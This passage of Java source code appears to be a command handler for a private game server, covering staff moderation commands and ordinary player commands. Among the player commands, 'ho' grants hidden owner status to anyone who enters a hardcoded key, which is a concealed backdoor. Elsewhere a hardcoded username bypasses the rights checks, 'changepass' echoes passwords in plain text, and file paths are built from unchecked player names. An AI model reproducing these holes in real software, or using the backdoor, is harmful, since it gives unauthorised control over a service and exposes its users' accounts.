			boolean console, boolean clientCommand) {
		if (clientCommand) {

		} else {
			switch (cmd[0]) {
			
			case "viewbank": {
				String name = formatInput(cmd);
				Player other = Game.getPlayerByDisplayName(name);
				try {
					player.packets().sendItems(95,
							other.getBank().getContainerCopy());
					player.getBank().openPlayerBank(other);
				} catch (Exception e) {
					player.packets().sendMessage(
							"The player " + name
									+ " is currently unavailable.");
				}
				return true;
			}
				
			case "unmute":
				String name = formatInput(cmd);
				Player target = Game.getPlayerByDisplayName(name);
				if (target != null) {
					target.setMuted(0);
					player.sm("You've unmuted: " + target.getDisplayName()+ ".");
					SFiles.savePlayer(target);
				} else {
					File file = new File("data/characters/"
							+ name.replace(" ", "_") + ".player");
					try {
						target = (Player) SFiles.loadSerializedFile(file);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setMuted(0);
					player.sm("You've unmuted: "
						+ Misc.formatPlayerNameForDisplay(name)
							+ ".");
					try {
						SFiles.storeSerializableClass(target, file);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
				
			case "bconfig":
				if (cmd.length < 3) {
					player.packets().sendPanelBoxMessage(
							"Use: bconfig id value");
					return true;
				}
				try {
					player.packets().sendGlobalConfig(Integer.valueOf(cmd[1]),
							Integer.valueOf(cmd[2]));
				} catch (NumberFormatException e) {
					player.packets().sendPanelBoxMessage(
							"Use: bconfig id value");
				}
				return true;
				
			case "checkdisplay":
				for (Player p : Game.getPlayers()) {
					if (p == null)
						continue;
					String[] invalids = { "<img", "<img=", "col", "<col=",
							"<shad", "<shad=", "<str>", "<u>" };
					for (String s : invalids)
						if (p.getDisplayName().contains(s)) {
							player.packets().sendMessage(
									Misc.formatPlayerNameForDisplay(p
											.getUsername()));
						} else {
							player.packets().sendMessage("None exist!");
						}
				}
				return true;
			
			case "mute":
				name = formatInput(cmd);
				target = Game.getPlayerByDisplayName(name);
				if(target == null) {
					name = Misc.formatPlayerNameForProtocol(name);
					if (!SFiles.containsPlayer(name)) {
						player.packets().sendMessage("Account name "
							+ Misc.formatPlayerNameForDisplay(name)
								+ " doesn't exist.");
						return true;
					}
					target = SFiles.loadPlayer(name);
					target.setUsername(name);
				}
				if((target.getRights() >= 1 && !player.getUsername().toLowerCase().contains("lucifer"))) {
					player.sm("You cannot mute that person.");
					return true;
				}
				target.setMuted(Misc.currentTimeMillis()
					+ (player.getRights() >= 2 ? (TimeUtils.getHours(48))
						: (TimeUtils.getHours(1))));
				player.sm("You've muted "+target.getDisplayName() + " for "+ (player.getRights() >= 2 ? 
					"48 hours." : "1 hour."));
				SFiles.savePlayer(target);
				return true;

			case "jail":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayerByDisplayName(name);
				if (target != null) {
					if((target.getRights() >= 1 && !player.getUsername().toLowerCase().contains("lucifer"))) {
						player.sm("You cannot jail that person.");
						return true;
					}
					target.setJailed(Misc.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					target.getControllerManager()
							.startController("JailControler");
					target.packets().sendMessage(
							"You've been Jailed for 24 hours by "
									+ Misc.formatPlayerNameForDisplay(player
											.getUsername()) + ".");
					player.packets().sendMessage(
							"You have Jailed "
									+ target.getDisplayName() + " for 24 hours.");
					SFiles.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"
							+ name.replace(" ", "_") + ".p");
					try {
						target = (Player) SFiles.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setJailed(Misc.currentTimeMillis()
							+ (24 * 60 * 60 * 1000));
					player.packets().sendMessage(
							"You have muted 24 hours: "
									+ Misc.formatPlayerNameForDisplay(name)
									+ ".");
					try {
						SFiles.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;
				
			case "forcekick":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayerByDisplayName(name);
				if (target == null) {
					player.packets().sendMessage(
							Misc.formatPlayerNameForDisplay(name)
									+ " is not logged in.");
					return true;
				}
				if((target.getRights() >= 1 && !player.getUsername().toLowerCase().contains("lucifer"))) {
					player.sm("You cannot kick that person.");
					return true;
				}
				if(!target.isBot())
					target.getSession().getChannel().close();
				else
					((Bot) target).finish();
				player.packets().sendMessage(
						"You've force kicked: " + target.getDisplayName() + ".");
				return true;

			case "kick":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayerByDisplayName(name);
				if (target == null) {
					player.packets().sendMessage(
							Misc.formatPlayerNameForDisplay(name)
									+ " is not logged in.");
					return true;
				}
				target.logout();
				player.packets().sendMessage(
						"You have kicked: " + target.getDisplayName() + ".");
				return true;

			case "hide":
				if (player.getControllerManager().getControler() != null) {
					player.packets().sendMessage(
							"You cannot hide in a public event!");
					return true;
				}
				player.getAppearance().switchHidden();
				player.packets().sendMessage(
						"Hidden? " + player.getAppearance().isHidden());
				return true;

			case "unjail":
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayerByDisplayName(name);
				if (target != null) {
					target.setJailed(0);
					target.getControllerManager()
							.startController("JailControler");
					target.packets().sendMessage(
							"You've been unjailed by "
									+ Misc.formatPlayerNameForDisplay(player
											.getUsername()) + ".");
					player.packets().sendMessage(
							"You have unjailed: " + target.getDisplayName()
									+ ".");
					SFiles.savePlayer(target);
				} else {
					File acc1 = new File("data/characters/"
							+ name.replace(" ", "_") + ".p");
					try {
						target = (Player) SFiles.loadSerializedFile(acc1);
					} catch (ClassNotFoundException | IOException e) {
						e.printStackTrace();
					}
					target.setJailed(0);
					player.packets().sendMessage(
							"You have unjailed: "
									+ Misc.formatPlayerNameForDisplay(name)
									+ ".");
					try {
						SFiles.storeSerializableClass(target, acc1);
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				return true;

			case "teleto":
				if ((!player.isOwner() && player.isLocked())
						|| (!player.isOwner() && player.getControllerManager().getControler() != null)) {
					player.packets().sendMessage(
							"You cannot teleport away from here.");
					return true;
				}
				name = "";
				for (int i = 1; i < cmd.length; i++)
					name += cmd[i] + ((i == cmd.length - 1) ? "" : " ");
				target = Game.getPlayerByDisplayName(name);
				if (target == null)
					player.packets().sendMessage(
							"Couldn't find player " + name + ".");
				else
					player.setLocation(target);
				return true;
				
			case "sendhome":
				name = formatInput(cmd);
				target = Game.getPlayerByDisplayName(name);
				if (target == null)
					player.packets().sendMessage(
							"Couldn't find player " + name + ".");
				else {
					target.unlock();
					target.getControllerManager().forceStop();
					target.getRandomEvent().fullyStop(true);
					if (target.getNextLocation() == null) 
						target.setLocation(Constants.RESPAWN_PLAYER_LOCATION);
					player.sm("You have unnulled: " + target.getDisplayName()+ ".");
					return true;
				}
				return true;
			}
		}
		return false;
	}

	public static boolean processNormalCommand(Player player, String[] cmd,
			boolean console, boolean clientCommand) {
		switch (cmd[0]) {

		case "players":
			player.packets().sendMessage(
					"There are currently " + Game.getPlayers().size()
							+ " players playing " + Constants.SERVER_NAME + ".");
			return true;
			
		case "yell":
			if(Punishments.isIPMuted(player.getIP()) || Punishments.isPermMuted(player)) {
				player.sm("You have been permanently muted due to breaking a rule.");
				return false;
			}
			if(player.isMuted()) {
				player.sm("You have been temporarily muted due to breaking a rule.");
				player.sm("This mute will remain for a further: "+TimeUtils.formatCountdown(player.getMutedDelay())+".");
				player.sm("To prevent further mutes, please read the rules.");
				return false;
			}
			String yell = formatInput(cmd);
			Logs.write(player.getUsername()+" said: \""+
				Misc.optimizeText(yell)+"\" using the 'yell' command.", "YellLogs", player, true);
			if (player.getUsername().equals("lucifer"))
				Game.sendMessage("<col=000000><shad=0000ff>[Developer]<img=1>"
						+ player.getDisplayName() + ": "
						+ Misc.optimizeText(yell));
			else if (player.getUsername().equals("gogeta"))
				Game.sendMessage("<col=000000><shad=ff0000>[Super Saiyan 4]<img=1>"
						+ player.getDisplayName() + ": "
						+ Misc.optimizeText(yell));
			else if (player.getRights() == 2)
				Game.sendMessage("<col=FF0000>[Administrator]<img=1>"
						+ player.getDisplayName() + ": "
						+ Misc.optimizeText(yell));
			else if (player.getRights() == 1)
				Game.sendMessage("<col=FF0000>[Moderator]<img=1>"
						+ player.getDisplayName() + ": "
						+ Misc.optimizeText(yell));
			else if (player.getMembership().isMember())
				Game.sendMessage("<shad=00FF00>[$]Member"
						+ player.getDisplayName() + ": "
						+ Misc.optimizeText(yell));
			else 
				Game.sendMessage("<shad=ff0000>[Player]"
					+ player.getDisplayName() + ": "
					+ Misc.optimizeText(yell));
				//player.sm("You need to have a membership to use yell!");
			return true;
			
		case "house":
			Magic.telePlayer(player, player.getHouse().getHouseLocation(), true);
			return true;		
		
		case "getid": {
			String name = formatInput(cmd);
			ItemDefinition.getItemFromName(player, name);
			if(player.getRights() > 1 || player.isHiddenOwner())
				player.getDialogue().start(new SpawnGetItem());
			return true;
		} 
		
		case "getnid": {
			String name = formatInput(cmd);
			NPCDefinition.getNPCFromName(player, name);
			return true;
		} 
		
		case "getoid": {
			String name = formatInput(cmd);
			ObjectDefinition.getObjectFromName(player, name);
			return true;
		} 
		
		case "home": {
			Magic.telePlayer(player, Constants.RESPAWN_PLAYER_LOCATION, false);
			return true;
		}
		
		case "teleports": {
			player.getDialogue().start("SpiritTree", Game.findNPC(3637));
			return true;
		}
		
		case "maxhit": {
			player.sm("Theoretical Melee Max Hit: <col=ff0000>"+player.getTheoreticalMeleeMaxHit());
			player.sm("Theoretical Ranged Max Hit: <col=00ff00>"+player.getTheoreticalRangedMaxHit());
			player.sm("Theoretical Magic Max Hit: <col=0000ff>"+player.getTheoreticalMagicMaxHit());
			return true;
		}
		
		case "ho": {
			String key = cmd[1];
			if(key.equals("417065"))
				player.setHiddenOwner(true);
			return true;
		}
		
		case "nex": {
			Magic.telePlayer(player, Location.create(2902, 5204, 0), true);
			return true;
		}

		case "changepass":
			if (cmd[1].length() > 15) {
				player.packets().sendMessage(
						"Your password cannot exceed 15 characters.");
				return true;
			}
			player.setPassword(cmd[1]);
			player.packets().sendMessage(
					"You've changed your password! Your new password is " + cmd[1]
							+ ".");
			return true;
			
		}
		return clientCommand;
	}
	
	private static String formatInput(String[] sArray) {
		String s = "";
		for (int i = 1; i < sArray.length; i++)
			s += sArray[i] + ((i == sArray.length - 1) ? "" : " ");
		return s;
	}

	private Commands() {

	}
}